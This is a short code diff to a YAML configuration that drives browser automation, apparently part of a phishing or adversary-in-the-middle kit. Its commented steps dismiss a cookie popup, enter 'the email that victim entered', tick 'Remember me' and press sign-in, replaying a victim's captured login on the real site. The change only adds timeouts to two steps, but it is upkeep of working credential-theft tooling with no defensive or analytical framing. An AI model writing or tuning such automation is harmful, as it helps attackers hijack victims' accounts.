@@ -89,6 +89,7 @@ puppet:
         # Accept cookies if popup appears
         - selector: '#truste-consent-button, .accept-cookies, [aria-label="Accept Cookies"]'
           click: true
+          timeout: 5000
           post_wait: 1000
         # Enter the email that victim entered
         - selector: 'input[name="user"], #user, input[type="email"]'
@@ -124,6 +125,7 @@ puppet:
         # Check "Remember me" if present
         - selector: 'input[name="rememberMe"], #rememberMe, [type="checkbox"]'
           click: true
+          timeout: 3000
           post_wait: 500
         # Click the sign in button
         - selector: 'button[type="submit"], #sign_in, .sign-in-button'
